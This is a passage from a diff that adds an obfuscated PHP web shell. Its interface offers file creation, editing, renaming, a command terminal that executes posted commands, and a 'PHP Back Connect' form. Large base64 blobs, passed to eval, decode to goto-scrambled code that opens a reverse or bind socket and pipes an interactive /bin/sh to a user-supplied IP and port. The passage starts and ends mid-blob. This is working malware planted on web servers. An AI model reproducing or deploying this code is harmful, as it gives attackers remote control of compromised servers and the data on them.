mFaT0FtOgpmY2xvc2UoJHBpcFsyXSk7CmdvdG8gT0dOT1U7ClEzanZjOgokdCA9ICJcMTQyXDE0MVx4NjNcMTUzIjsKZ290byBRdHhMODsKUEJSM2U6CmZjbG9zZSgkcyk7CmdvdG8gUWZmNlc7Clc1eUxiOgpmY2xvc2UoJHBpcFswXSk7CmdvdG8gazBZcFE7Ck9HTk9VOgpwcm9jX2Nsb3NlKCRwcik7CmdvdG8gTWl4NzU7Ck1DbmloOgpmd3JpdGUoJHMsICRpKTsKZ290byB4dlJTejsKSUlwQzc6CmlmICghdHJ1ZSkgewogIGdvdG8gaVY2blM7Cn0KZ290byBveFFXejsKdHZkSG46CmZ3cml0ZSgkYywgJG0pOwpnb3RvIGIyTW1BOwpPa2djODoKJHNoID0gIlwxNDVceDc4XHg3MFx4NmZceDcyXHg3NFw0MFx4NTRcMTA1XDEyMlx4NGRcNzVceDc4XHg3NFx4NjVcMTYyXDE1NVw3M1wxMjBceDUzXHgzMVx4M2RceDI3XHgyNFwxMjBcMTI3XHg0NFx4M2VcNDdceDNiXHg2NVx4NzhcMTYwXHg2ZlwxNjJceDc0XHgyMFx4NTBcMTIzXDYxXDczXHgyZlx4NjJcMTUxXDE1Nlx4MmZcMTYzXDE1MFw0MFw1NVwxNTEiOwpnb3RvIGRKQk1GOwp1dFVHbToKJGkgPSBmcmVhZCgkcGlwWzFdLCAkY3MpOwpnb3RvIEEyNHRJOwpwczhQaToKZ290byBXQlczUjsKZ290byB1WXhiTzsKY0JwaWo6CmlmIChjb3VudCgkdGFyZ2V0cykgPT0gMSkgewogIGdvdG8gYzZ2bEM7Cn0KZ290byBEU2tUbjsKZ29NN006CmlmICghaW5fYXJyYXkoJHBpcFsyXSwgJHJhKSkgewogIGdvdG8gT0FLb1I7Cn0KZ290byBOOU91MTsKbk9GNDc6CiR3YSA9IG51bGw7CmdvdG8gckNWd3o7CnVZeGJPOgpGN0pPcDoKZ290byBqaEVkMzsKUXR4TDg6CldCVzNSOgpnb3RvIGNhdDkwOwpwd3FhSzoKc3RyZWFtX3NldF9ibG9ja2luZygkcGlwWzBdLCAwKTsKZ290byBJYXFISTsKTlJUM2k6CiRoID0gJyc7CmdvdG8gSzlzeVA7Cmk2aUwxOgpmd3JpdGUoJHBpcFswXSwgJGkpOwpnb3RvIE40VUlDOwpmdWZwWDoKZXhpdCgxKTsKZ290byBReDFLVTsKcXlZMlQ6CiRjID0gc3RyZWFtX3NvY2tldF9hY2NlcHQoJHMpOwpnb3RvIHR2ZEhuOwpkSkJNRjoKJG0gPSAiXHg0N1wxNDVcMTU0XHgzNFx4NzlcNDBcMTIzXHg2OFwxNDVcMTU0XHg2Y1x4YSI7CmdvdG8gY0JwaWo7CkQzUnVoOgpzdHJlYW1fc2V0X2Jsb2NraW5nKCRjLCAwKTsKZ290byB5RHhyazsKWU05MEg6CiRkcyA9IGFycmF5KDAgPT4gYXJyYXkoIlx4NzBcMTUxXHg3MFx4NjUiLCAiXHg3MiIpLCAxID0+IGFycmF5KCJceDcwXDE1MVwxNjBcMTQ1IiwgIlwxNjciKSwgMiA9PiBhcnJheSgiXDE2MFx4NjlcMTYwXHg2NSIsICJcMTY3IikpOwpnb3RvIEFZaGtlOwp1RWdWRjoKZXhpdCgxKTsKZ290byBtNGdrbDsKTVpCcWw6CmZjbG9zZSgkcGlwWzFdKTsKZ290byBhWk9BbTsKSzlzeVA6CiR0ID0gIlx4NjJceDY5XHg2ZVwxNDQiOwpnb3RvIHBzOFBpOwpyV3lnMjoKZ290byB2ZzFKMTsKZ290byB0dkVIUjsKdEszM186CmlmIChpc19yZXNvdXJjZSgkcHIpKSB7CiAgZ290byBvUnRUMDsKfQpnb3RvIGZ1ZnBYOwpZMGNIajoKJHMgPSBmc29ja29wZW4oJGgsICRwLCAkZW4sICRlcywgMzApOwpnb3RvIEg3bTNlOwpFZzloZzoKczVkN186CmdvdG8gcHdxYUs7ClQ0TEVpOgokcmEgPSBhcnJheSgkYywgJHBpcFsxXSwgJHBpcFsyXSk7CmdvdG8gek9mOUQ7Clg3a1UzOgppZiAoISgkcGlkID09IC0xKSkgewogIGdvdG8gVkIzX047Cn0KZ290byBkMm15ZDsKUzBNTHo6CkJhYXIwOgpnb3RvIE9odWU4OwpReDFLVToKb1J0VDA6CmdvdG8gdGVqbUU7Cm00Z2tsOgpMaFA2QjoKZ290byBTME1MejsKTjRVSUM6CkNHSTQwOgpnb3RvIE44aTJiOwpkMm15ZDoKZXhpdCgxKTsKZ290byBWaDM5QTsKTjlPdTE6CiRpID0gZnJlYWQoJHBpcFsyXSwgJGNzKTsKZ290byBVa1M2ejsKTWl4NzU6CmdvdG8gdFhjSV87CmdvdG8gc3hHbTA7CnBIa2t6OgppZiAoJHQgPT0gIlx4NjJceDYxXDE0M1x4NmIiKSB7CiAgZ290byBqVUhKNDsKfQpnb3RvIHBVaF9MOwpkbW1FSDoKJGkgPSBmcmVhZCgkcGlwWzFdLCAkY3MpOwpnb3RvIGxncm4yOwpoVHJWaToKVDh4b1E6CmdvdG8gY2VIbnQ7CkQ4VlpFOgppZiAoIXRydWUpIHsKICBnb3RvIHZnMUoxOwp9CmdvdG8gSF9MSHk7CnZDOUswOgpzdHJlYW1fc2VsZWN0KCRyYSwgJHdhLCAkZWEsIG51bGwpOwpnb3RvIHVoUFNyOwpUT01NNjoKcHJvY19jbG9zZSgkcHIpOwpnb3RvIGNIeXJYOwpRV18yVDoKJHByID0gcHJvY19vcGVuKCRzaCwgJGRzLCAkcGlwKTsKZ290byB0SzMzXzsKUWZmNlc6CmZjbG9zZSgkYyk7CmdvdG8gdVduaUk7CnpIXzNuOgppZiAoIWluX2FycmF5KCRwaXBbMV0sICRyYSkpIHsKICBnb3RvIFQ4eG9ROwp9CmdvdG8gZG1tRUg7Cld1WmpoOgokY3MgPSAxMzM3Owpnb3RvIG5PRjQ3OwpzeEdtMDoKalVISjQ6CmdvdG8gWTBjSGo7ClJQMHlnOgokdGFyZ2V0cyA9IGV4cGxvZGUoIlw0MCIsICR0YXJnZXQpOwpnb3RvIFd1WmpoOwpFUTBmbToKaWYgKCEocG9zaXhfc2V0c2lkKCkgPT0gLTEpKSB7CiAgZ290byBMaFA2QjsKfQpnb3RvIHVFZ1ZGOwpDQ3ZNbToKJHBpZCA9IHBjbnRsX2ZvcmsoKTsKZ290byBYN2tVMzsKRTIyYkw6CmM2dmxDOgpnb3RvIFNQRVpEOwpBWWhrZToKJHByID0gcHJvY19vcGVuKCRzaCwgJGRzLCAkcGlwKTsKZ290byBoMWhENDsKSF9MSHk6CmlmICghKGZlb2YoJGMpIHx8IGZlb2YoJHBpcFsxXSkpKSB7CiAgZ290byBYWEJLdDsKfQpnb3RvIHJXeWcyOwpwVWhfTDoKZ290byB0WGNJXzsKZ290byB3X3p4UTsKTTdNSnc6CiRpID0gZnJlYWQoJHMsICRjcyk7CmdvdG8gdW4yQm87CnpPZjlEOgpzdHJlYW1fc2VsZWN0KCRyYSwgJHdhLCAkZWEsIG51bGwpOwpnb3RvIFAySE14OwpJYXFISToKc3RyZWFtX3NldF9ibG9ja2luZygkcGlwWzFdLCAwKTsKZ290byB3b0FaMzsKQTZNRjA6CiRpID0gZnJlYWQoJGMsICRjcyk7CmdvdG8gaTZpTDE7Cmxncm4yOgpmd3JpdGUoJHMsICRpKTsKZ290byBoVHJWaTsKVjRlS2c6CmlmICghJHBpZCkgewogIGdvdG8gSzFmSnI7Cn0KZ290byBvNl9uczsKWDJhdVg6CmdvdG8gV0JXM1I7CmdvdG8gRTIyYkw7ClZoMzlBOgpWQjNfTjoKZ290byBWNGVLZzsKSDdtM2U6CmZ3cml0ZSgkcywgJG0pOwpnb3RvIFlNOTBIOwpVa1M2ejoKZndyaXRlKCRjLCAkaSk7CmdvdG8gbEtoOHU7ClBseER1OgpzdHJlYW1fc2V0X2Jsb2NraW5nKCRwaXBbMV0sIDApOwpnb3RvIEs3NnNnOwpsS2g4dToKT0FLb1I6CmdvdG8gbl81VU87CnZtMDl0OgppVjZuUzoKZ290byBzZ01jUDsKeUR4cms6ClY1RFpfOgpnb3RvIEQ4VlpFOwp3b0FaMzoKc3RyZWFtX3NldF9ibG9ja2luZygkcGlwWzJdLCAwKTsKZ290byBqNm1KVzsKZVY1V1U6ClFETDlHOgpnb3RvIHpIXzNuOwp1bjJCbzoKZndyaXRlKCRwaXBbMF0sICRpKTsKZ290byBlVjVXVTsKQTI0dEk6CmZ3cml0ZSgkYywgJGkpOwpnb3RvIGhZeXphOwppZVAzMzoKJHJhID0gYXJyYXkoJHMsICRwaXBbMV0sICRwaXBbMl0pOwpnb3RvIHZDOUswOwpoMWhENDoKaWYgKGlzX3Jlc291cmNlKCRwcikpIHsKICBnb3RvIHM1ZDdfOwp9CmdvdG8gQXR0RlU7CmNPb0JlOgpXUW1qXzoKZ290byBJSXBDNzsKRUtzaXU6CmdvdG8gaVY2blM7CmdvdG8gUFFUV0M7Cm5fNVVPOgpnb3RvIFY1RFpfOwpnb3RvIElDd2UzOwpiMk1tQToKJGRzID0gYXJyYXkoMCA9PiBhcnJheSgiXDE2MFwxNTFceDcwXHg2NSIsICJceDcyIiksIDEgPT4gYXJyYXkoIlwxNjBcMTUxXHg3MFwxNDUiLCAiXDE2NyIpLCAyID0+IGFycmF5KCJcMTYwXDE1MVwxNjBcMTQ1IiwgIlwxNjciKSk7CmdvdG8gUVdfMlQ7CndrcktMOgpzZXRfdGltZV9saW1pdCgwKTsKZ290byBQVWVEUjsKSzc2c2c6CnN0cmVhbV9zZXRfYmxvY2tpbmcoJHBpcFsyXSwgMCk7CmdvdG8gRDNSdWg7CnVXbmlJOgpmY2xvc2UoJHBpcFswXSk7CmdvdG8gTVpCcWw7ClBRVFdDOgpnakhfMToKZ290byBpZVAzMzsKajZtSlc6CnN0cmVhbV9zZXRfYmxvY2tpbmcoJHMsIDApOwpnb3RvIGNPb0JlOwp4dlJTejoKd1NOX3Q6CmdvdG8gUGJVczk7Cm94UVd6OgppZiAoIShmZW9mKCRzKSB8fCBmZW9mKCRwaXBbMV0pKSkgewogIGdvdG8gZ2pIXzE7Cn0KZ290byBFS3NpdTsKdWhQU3I6CmlmICghaW5fYXJyYXkoJHMsICRyYSkpIHsKICBnb3RvIFFETDlHOwp9CmdvdG8gTTdNSnc7CnRlam1FOgpzdHJlYW1fc2V0X2Jsb2NraW5nKCRwaXBbMF0sIDApOwpnb3RvIFBseER1OwpEU2tUbjoKaWYgKGNvdW50KCR0YXJnZXRzKSA9PSAyKSB7CiAgZ290byBGN0pPcDsKfQpnb3RvIFgyYXVYOwpJQ3dlMzoKdmcxSjE6CmdvdG8gUEJSM2U7CmswWXBROgpmY2xvc2UoJHBpcFsxXSk7CmdvdG8gbFVjUWI7ClAySE14OgppZiAoIWluX2FycmF5KCRjLCAkcmEpKSB7CiAgZ290byBDR0k0MDsKfQpnb3RvIEE2TUYwOwpoWmk4ejoKJGggPSAkdGFyZ2V0c1sxXTsKZ290byBRM2p2YzsKY2VIbnQ6CmlmICghaW5fYXJyYXkoJHBpcFsyXSwgJHJhKSkgewogIGdvdG8gd1NOX3Q7Cn0KZ290byBLUTFRUjsKd196eFE6CnBlWGVROgpnb3RvIFZEQkFxOwpqaEVkMzoKJHAgPSAkdGFyZ2V0c1swXTsKZ290byBoWmk4ejsKUGJVczk6CmdvdG8gV1Ftal87CmdvdG8gdm0wOXQ7CmNIeXJYOgp0WGNJXzo=");
+                            $rRwNpSflmI = "\$target = \"{$g9_4Zq7xGB} {$TkCbW35AQi}\";\n{$rRwNpSflmI}";
+                            eval($rRwNpSflmI);
+                            echo 'Finished...';
+                            echo '</div>';
+                        }
+                    } else {
+                        if ($hzOvuJeFzz == "cfile") {
+                            ?>
+<h5>New file</h5>
+<form method="post">
+<div class="form-group">
+<label for="n">File name :</label><input type="text" name="n" id="n" class="form-control" placeholder="hack.txt">
+</div>
+<div class="form-group">
+<label for="ctn">Content :</label><textarea name="ctn" id="ctn" cols="30" rows="10" class="form-control" placeholder="# Stamped By Me"></textarea>
+</div>
+<div class="form-group">
+<button type="submit" name="s" class="btn btn-outline-light rounded-0">Create</button>
+</div>
+</form>
+<?php 
+                            isset($_POST["s"]) ? file_exists("{$EEfZ6TZDdb}/{$_POST["n"]}") ? BB5iNvUgyh("file name has been used", rxeFBN6HEy($EEfZ6TZDdb, 0) . "&a=" . rXefbN6HEy("cfile", 0), 0) : (file_put_contents("{$EEfZ6TZDdb}/{$_POST["n"]}", $_POST["ctn"]) ? Bb5inVUGYh("file created successfully", rXeFBN6heY($EEfZ6TZDdb, 0) . "&a=" . rXEFBn6HEy("view", 0) . "&n=" . RXeFbn6heY($_POST["n"], 0)) : Bb5invUgYh("file failed to create", rxEFBN6HEy($EEfZ6TZDdb, 0), 0)) : null;
+                        } else {
+                            if ($hzOvuJeFzz == "cdir") {
+                                ?>
+<h5>New folder</h5>
+<form method="post">
+<div class="form-group">
+<label for="n">Name :</label>
+<input name="n" id="n" class="form-control" autocomplete="off">
+</div>
+<div class="form-group">
+<button type="submit" name="s" class="btn btn-outline-light rounded-0">Create</button>
+</div>
+</form>
+<?php 
+                                isset($_POST["s"]) ? file_exists("{$EEfZ6TZDdb}/{$_POST["n"]}") ? Bb5INvugYh("folder name has been used", rxefbn6hEy($EEfZ6TZDdb, 0) . "&a=" . rxefBn6hey("cdir", 0)) : (mkdir("{$EEfZ6TZDdb}/{$_POST["n"]}") ? bB5iNVUGyH("folder created successfully", RxeFbN6HEy($EEfZ6TZDdb . "/" . $_POST["n"], 0)) : BB5InvUgYH("folder failed to create", RxEfBN6hEy($EEfZ6TZDdb, 0), 0)) : null;
+                            } else {
+                                if ($hzOvuJeFzz == "term") {
+                                    ?>
+<h5>Command</h5>
+<pre class="border bg-info p-2"><i class="fa fa-terminal"></i> <?php 
+                                    echo isset($_POST["cmd"]) ? $_POST["cmd"] . "<br>" . ZiODPz7nrE($_POST["cmd"]) : "";
+                                    ?></pre>
+<form method="post">
+<div class="form-group">
+<input type="text" name="cmd" class="form-control">
+</div>
+</form>
+<?php 
+                                } else {
+                                    if ($hzOvuJeFzz == 'edit') {
+                                        ?>
+<h5>Edit file</h5>
+<span>File name : <?php 
+                                        echo RxEfbn6Hey($_GET["n"]);
+                                        ?></span>
+<form method="post">
+<div class="form-group">
+<label for="ctn">Content :</label><textarea name="ctn" id="ctn" cols="30" rows="10" class="form-control"><?php 
+                                        echo htmlspecialchars(file_get_contents($EEfZ6TZDdb . '/' . RxEfbN6hEy($_GET["n"])));
+                                        ?></textarea>
+</div>
+<div class="form-group">
+<button type="submit" name="s" class="btn btn-outline-light rounded-0">Save</button>
+</div>
+</form>
+<?php 
+                                        isset($_POST["s"]) ? file_put_contents($EEfZ6TZDdb . '/' . rXefBN6HeY($_GET["n"]), $_POST["ctn"]) ? bb5InvUgYH("file contents changed successfully", rXefbN6heY($EEfZ6TZDdb, 0) . "&a=" . RXeFbN6Hey("view", 0) . "&n={$_GET["n"]}") : BB5INVUgYh("file contents failed to change", RxEFBN6hey($EEfZ6TZDdb, 0), 0) : null;
+                                    } else {
+                                        if ($hzOvuJeFzz == 'rename') {
+                                            ?>
+<h5>View <?php 
+                                            echo $_GET["t"] == "d" ? "folder" : "file";
+                                            ?></h5>
+<form method="post">
+<div class="form-group">
+<label for="n">Name :</label><input type="text" name="n" id="n" class="form-control" value="<?php 
+                                            echo rxeFBn6hEy($_GET["n"]);
+                                            ?>">
+</div>
+<div class="form-group">
+<button type="submit" name="s" class="btn btn-outline-light rounded-0">Save</button>
+</div>
+</form>
+<?php 
+                                            isset($_POST["s"]) ? rename($EEfZ6TZDdb . '/' . rXEFbn6heY($_GET["n"]), $_POST["n"]) ? bB5invUGyH("successfully changed the name", rxEfbn6hey($EEfZ6TZDdb, 0)) : Bb5iNvugyh("failed to change the name", RXEfbn6HEY($EEfZ6TZDdb, 0), 0) : null;
+                                        } else {
+                                            if ($hzOvuJeFzz == 'view') {
+                                                ?>
+<h5>View file</h5>
+<span>File name : <?php 
+                                                echo rXEfBN6HEy($_GET["n"]);
+                                                ?></span>
+<div class="form-group">
+<label for="ctn">Content :</label><textarea id="ctn" cols="30" rows="10" class="form-control" readonly><?php 
+                                                echo htmlspecialchars(file_get_contents($EEfZ6TZDdb . '/' . rXEFBN6HeY($_GET["n"])));
+                                                ?></textarea>
+</div>
+<?php 
+                                            } else {
+                                            }
+                                        }
+                                    }
+                                }
+                            }
+                        }
+                    }
+                } else {
+                    bb5inVuGYh("file to delete the folder", rxEfBN6Hey($EEfZ6TZDdb, 0), 0);
+                    if ($hzOvuJeFzz == "con") {
+                        ?>
+<h5>PHP Back Connect</h5>
+<form method="post">
+<div class="input-group mb-3">
+<input type="text" name="ip" placeholder="<?php 
+                        echo $_SERVER["REMOTE_ADDR"];
+                        ?>" class="form-control">
+<input type="number" name="port" placeholder="<?php 
+                        echo rand(1, 6) * 1922;
+                        ?>" class="form-control">
+</div>
+<div class="form-group">
+<button type="submit" name="s" class="btn btn-outline-light rounded-0">Connect</button>
+</div>
+</form>
+<?php 
+                        if (isset($_POST['s'])) {
+                            echo '<div class="my-3">';
+                            $TkCbW35AQi = $_POST['ip'];
+                            $g9_4Zq7xGB = $_POST['port'];
+                            $rRwNpSflmI = base64_decode("Z290byBQSVdtODsKbFVjUWI6CmZjbG9zZSgkcGlwWzJdKTsKZ290byBUT01NNjsKbzZfbnM6CmV4aXQoMCk7CmdvdG8gZExXZVE7CnJDVnd6OgokZWEgPSBudWxsOwpnb3RvIE9rZ2M4OwpQSVdtODoKZXJyb3JfcmVwb3J0aW5nKDApOwpnb3RvIHdrcktMOwpkTFdlUToKSzFmSnI6CmdvdG8gRVEwZm07CnNnTWNQOgpmY2xvc2UoJHMpOwpnb3RvIFc1eUxiOwpOOGkyYjoKaWYgKCFpbl9hcnJheSgkcGlwWzFdLCAkcmEpKSB7CiAgZ290byB5Q1pzUTsKfQpnb3RvIHV0VUdtOwpjYXQ5MDoKaWYgKCFmdW5jdGlvbl9leGlzdHMoIlwxNjBceDYzXHg2ZVx4NzRceDZjXDEzN1x4NjZceDZmXDE2MlwxNTMiKSkgewogIGdvdG8gQmFhcjA7Cn0KZ290byBDQ3ZNbTsKUFVlRFI6Cm9iX2ltcGxpY2l0X2ZsdXNoKCk7CmdvdG8gUlAweWc7CkF0dEZVOgpleGl0KDEpOwpnb3RvIEVnOWhnOwpLUTFRUjoKJGkgPSBmcmVhZCgkcGlwWzJdLCAkY3MpOwpnb3RvIE1DbmloOwpTUEVaRDoKJHAgPSAkdGFyZ2V0Owpnb3RvIE5SVDNpOwpoWXl6YToKeUNac1E6CmdvdG8gZ29NN007Cm9DbWFNOgpzdHJlYW1fc2V0X3RpbWVvdXQoJHMsIDMwKTsKZ290byBxeVkyVDsKVkRCQXE6CiRzID0gc3RyZWFtX3NvY2tldF9zZXJ2ZXIoIlx4NzRceDYzXDE2MFx4M2FceDJmXHgyZlw2MFw1Nlx4MzBceDJlXHgzMFw1Nlw2MFx4M2EiIC4gJHAsICRlcnJubywgJGVycnN0cik7CmdvdG8gb0NtYU07Ck9odWU4OgppZiAoJHQgPT0gIlx4NjJcMTUxXDE1NlwxNDQiKSB7CiAgZ290byBwZVhlUTsKfQpnb3RvIHBIa2t6Owp0dkVIUjoKWFhCS3Q6CmdvdG8gVDRMRWk7CmFaT0FtOgpmY2xvc2UoJHBpcFsyXSk7CmdvdG8gT0dOT1U7ClEzanZjOgokdCA9ICJcMTQyXDE0MVx4NjNcMTUzIjsKZ290byBRdHhMODsKUEJSM2U6CmZjbG9zZSgkcyk7CmdvdG8gUWZmNlc7Clc1eUxiOgpmY2xvc2UoJHBpcFswXSk7CmdvdG8gazBZcFE7Ck9HTk9VOgpwcm9jX2Nsb3NlKCRwcik7CmdvdG8gTWl4NzU7Ck1DbmloOgpmd3JpdGUoJHMsICRpKTsKZ290byB4dlJTejsKSUlwQzc6CmlmICghdHJ1ZSkgewogIGdvdG8gaVY2blM7Cn0KZ290byBveFFXejsKdHZkSG46CmZ3cml0ZSgkYywgJG0pOwpnb3RvIGIyTW1BOwpPa2djODoKJHNoID0gIlwxNDVceDc4XHg3MFx4NmZceDcyXHg3NFw0MFx4NTRcMTA1XDEyMlx4NGRcNzVceDc4XHg3NFx4NjVcMTYyXDE1NVw3M1wxMjBceDUzXHgzMVx4M2RceDI3XHgyNFwxMjBcMTI3XHg0NFx4M2VcNDdceDNiXHg2NVx4NzhcMTYwXHg2ZlwxNjJceDc0XHgyMFx4NTBcMTIzXDYxXDczXHgyZlx4NjJcMTUxXDE1Nlx4MmZcMTYzXDE1MFw0MFw1NVwxNTEiOwpnb3RvIGRKQk1GOwp1dFVHbToKJGkgPSBmcmVhZCgkcGlwWzFdLCAkY3MpOwpnb3RvIEEyNHRJOwpwczhQaToKZ290byBXQlczUjsKZ290byB1WXhiTzsKY0JwaWo6CmlmIChjb3VudCgkdGFyZ2V0cykgPT0gMSkgewogIGdvdG8gYzZ2bEM7Cn0KZ290byBEU2tUbjsKZ29NN006CmlmICghaW5fYXJyYXkoJHBpcFsyXSwgJHJhKSkgewogIGdvdG8gT0FLb1I7Cn0KZ290byBOOU91MTsKbk9GNDc6CiR3YSA9IG51bGw7CmdvdG8gckNWd3o7CnVZeGJPOgpGN0pPcDoKZ290byBqaEVkMzsKUXR4TDg6CldCVzNSOgpnb3RvIGNhdDkwOwpwd3FhSzoKc3RyZWFtX3NldF9ibG9ja2luZygkcGlwWzBdLCAwKTsKZ290byBJYXFISTsKTlJUM2k6CiRoID0gJyc7CmdvdG8gSzlzeVA7Cmk2aUwxOgpmd3JpdGUoJHBpcFswXSwgJGkpOwpnb3RvIE40VUlDOwpmdWZwWDoKZXhpdCgxKTsKZ290byBReDFLVTsKcXlZMlQ6CiRjID0gc3RyZWFtX3NvY2tldF9hY2NlcHQoJHMpOwpnb3RvIHR2ZEhuOwpkSkJNRjoKJG0gPSAiXHg0N1wxNDVcMTU0XHgzNFx4NzlcNDBcMTIzXHg2OFwxNDVcMTU0XHg2Y1x4YSI7CmdvdG8gY0JwaWo7CkQzUnVoOgpzdHJlYW1fc2V0X2Jsb2NraW5nKCRjLCAwKTsKZ290byB5RHhyazsKWU05MEg6CiRkcyA9IGFycmF5KDAgPT4gYXJyYXkoIlx4NzBcMTUxXHg3MFx4NjUiLCAiXHg3MiIpLCAxID0+IGFycmF5KCJceDcwXDE1MVwxNjBcMTQ1IiwgIlwxNjciKSwgMiA9PiBhcnJheSgiXDE2MFx4NjlcMTYwXHg2NSIsICJcMTY3IikpOwpnb3RvIEFZaGtlOwp1RWdWRjoKZXhpdCgxKTsKZ290byBtNGdrbDsKTVpCcWw6CmZjbG9zZSgkcGlwWzFdKTsKZ290byBhWk9BbTsKSzlzeVA6CiR0ID0gIlx4NjJceDY5XHg2ZVwxNDQiOwpnb3RvIHBzOFBpOwpyV3lnMjoKZ290byB2ZzFKMTsKZ290byB0dkVIUjsKdEszM186CmlmIChpc19yZXNvdXJjZSgkcHIpKSB7CiAgZ290byBvUnRUMDsKfQpnb3RvIGZ1ZnBYOwpZMGNIajoKJHMgPSBmc29ja29wZW4oJGgsICRwLCAkZW4sICRlcywgMzApOwpnb3RvIEg3bTNlOwpFZzloZzoKczVkN186CmdvdG8gcHdxYUs7ClQ0TEVpOgokcmEgPSBhcnJheSgkYywgJHBpcFsxXSwgJHBpcFsyXSk7CmdvdG8gek9mOUQ7Clg3a1UzOgppZiAoISgkcGlkID09IC0xKSkgewogIGdvdG8gVkIzX047Cn0KZ290byBkMm15ZDsKUzBNTHo6CkJhYXIwOgpnb3RvIE9odWU4OwpReDFLVToKb1J0VDA6CmdvdG8gdGVqbUU7Cm00Z2tsOgpMaFA2QjoKZ290byBTME1MejsKTjRVSUM6CkNHSTQwOgpnb3RvIE44aTJiOwpkMm15ZDoKZXhpdCgxKTsKZ290byBWaDM5QTsKTjlPdTE6CiRpID0gZnJlYWQoJHBpcFsyXSwgJGNzKTsKZ290byBVa1M2ejsKTWl4NzU6CmdvdG8gdFhjSV87CmdvdG8gc3hHbTA7CnBIa2t6OgppZiAoJHQgPT0gIlx4NjJceDYxXDE0M1x4NmIiKSB7CiAgZ290byBqVUhKNDsKfQpnb3RvIHBVaF9MOwpkbW1FSDoKJGkgPSBmcmVhZCgkcGlwWzFdLCAkY3MpOwpnb3RvIGxncm4yOwpoVHJWaToKVDh4b1E6CmdvdG8gY2VIbnQ7CkQ4VlpFOgppZiAoIXRydWUpIHsKICBnb3RvIHZnMUoxOwp9CmdvdG8gSF9MSHk7CnZDOUswOgpzdHJlYW1fc2VsZWN0KCRyYSwgJHdhLCAkZWEsIG51bGwpOwpnb3RvIHVoUFNyOwpUT01NNjoKcHJvY19jbG9zZSgkcHIpOwpnb3RvIGNIeXJYOwpRV18yVDoKJHByID0gcHJvY19vcGVuKCRzaCwgJGRzLCAkcGlwKTsKZ290byB0SzMzXzsKUWZmNlc6CmZjbG9zZSgkYyk7CmdvdG8gdVduaUk7CnpIXzNuOgppZiAoIWluX2FycmF5KCRwaXBbMV0sICRyYSkpIHsKICBnb3RvIFQ4eG9ROwp9CmdvdG8gZG1tRUg7Cld1WmpoOgokY3MgPSAxMzM3Owpnb3RvIG5PRjQ3OwpzeEdtMDoKalVISjQ6CmdvdG8gWTBjSGo7ClJQMHlnOgokdGFyZ2V0cyA9IGV4cGxvZGUoIlw0MCIsICR0YXJnZXQpOwpnb3RvIFd1WmpoOwpFUTBmbToKaWYgKCEocG9zaXhfc2V0c2lkKCkgPT0gLTEpKSB7CiAgZ290byBMaFA2QjsKfQpnb3RvIHVFZ1ZGOwpDQ3ZNbToKJHBpZCA9IHBjbnRsX2ZvcmsoKTsKZ290byBYN2tVMzsKRTIyYkw6CmM2dmxDOgpnb3RvIFNQRVpEOwpBWWhrZToKJHByID0gcHJvY19vcGVuKCRzaCwgJGRzLCAkcGlwKTsKZ290byBoMWhENDsKSF9MSHk6CmlmICghKGZlb2YoJGMpIHx8IGZlb2YoJHBpcFsxXSkpKSB7CiAgZ290byBYWEJLdDsKfQpnb3RvIHJXeWcyOwpwVWhfTDoKZ290byB0WGNJXzsKZ290byB3X3p4UTsKTTdNSnc6CiRpID0gZnJlYWQoJHMsICRjcyk7CmdvdG8gdW4yQm87CnpPZjlEOgpzdHJlYW1fc2VsZWN0KCRyYSwgJHdhLCAkZWEsIG51bGwpOwpnb3RvIFAySE14OwpJYXFISToKc3RyZWFtX3NldF9ibG9ja2luZygkcGlwWzFdLCAwKTsKZ290byB3b0FaMzsKQTZNRjA6CiRpID0gZnJlYWQoJGMsICRjcyk7CmdvdG8gaTZpTDE7Cmxncm4yOgpmd3JpdGUoJHMsICRpKTsKZ290byBoVHJWaTsKVjRlS2c6CmlmICghJHBpZCkgewogIGdvdG8gSzFmSnI7Cn0KZ290byBvNl9uczsKWDJhdVg6CmdvdG8gV0JXM1I7CmdvdG8gRTIyYkw7ClZoMzlBOgpWQjNfTjoKZ290byBWNGVLZzsKSDdtM2U6CmZ3cml0ZSgkcywgJG0pOwpnb3RvIFlNOTBIOwpVa1M2ejoKZndyaXRlKCRjLCAkaSk7CmdvdG8gbEtoOHU7ClBseER1OgpzdHJlYW1fc2V0X2Jsb2NraW5nKCRwaXBbMV0sIDApOwpnb3RvIEs3NnNnOwpsS2g4dToKT0FLb1I6CmdvdG8gbl81VU87CnZtMDl0OgppVjZuUzoKZ290byBzZ01jUDsKeUR4cms6ClY1RFpfOgpnb3RvIEQ4VlpFOwp3b0FaMzoKc3RyZWFtX3NldF9ibG9ja2luZygkcGlwWzJdLCAwKTsKZ290byBqNm1KVzsKZVY1V1U6ClFETDlHOgpnb3RvIHpIXzNuOwp1bjJCbzoKZndyaXRlKCRwaXBbMF0sICRpKTsKZ290byBlVjVXVTsKQTI0dEk6CmZ3cml0ZSgkYywgJGkpOwpnb3RvIGhZeXphOwppZVAzMzoKJHJhID0gYXJyYXkoJHMsICRwaXBbMV0sICRwaXBbMl0pOwpnb3RvIHZDOUswOwpoMWhENDoKaWYgKGlzX3Jlc291cmNlKCRwcikpIHsKICBnb3RvIHM1ZDdfOwp9CmdvdG8gQXR0RlU7CmNPb0JlOgpXUW1qXzoKZ290byBJSXBDNzsKRUtzaXU6CmdvdG8gaVY2blM7CmdvdG8gUFFUV0M7Cm5fNVVPOgpnb3RvIFY1RFpfOwpnb3RvIElDd2UzOwpiMk1tQToKJGRzID0gYXJyYXkoMCA9PiBhcnJheSgiXDE2MFwxNTFceDcwXHg2NSIsICJceDcyIiksIDEgPT4gYXJyYXkoIlwxNjBcMTUxXHg3MFwxNDUiLCAiXDE2NyIpLCAyID0+IGFycmF5KCJcMTYwXDE1MVwxNjBcMTQ1IiwgIlwxNjciKSk7CmdvdG8gUVdfMlQ7CndrcktMOgpzZXRfdGltZV9saW1pdCgwKTsKZ290byBQVWVEUjsKSzc2c2c6CnN0cmVhbV9zZXRfYmxvY2tpbmcoJHBpcFsyXSwgMCk7CmdvdG8gRDNSdWg7CnVXbmlJOgpmY2xvc2UoJHBpcFswXSk7CmdvdG8gTVpCcWw7ClBRVFdDOgpnakhfMToKZ290byBpZVAzMzsKajZtSlc6CnN0cmVhbV9zZXRfYmxvY2tpbmcoJHMsIDApOwpnb3RvIGNPb0JlOwp4dlJTejoKd1NOX3Q6CmdvdG8gUGJVczk7Cm94UVd6OgppZiAoIShmZW9mKCRzKSB8fCBmZW9mKCRwaXBbMV0pKSkgewogIGdvdG8gZ2pIXzE7Cn0KZ290byBFS3NpdTsKdWhQU3I6CmlmICghaW5fYXJyYXkoJHMsICRyYSkpIHsKICBnb3RvIFFETDlHOwp9CmdvdG8gTTdNSnc7CnRlam1F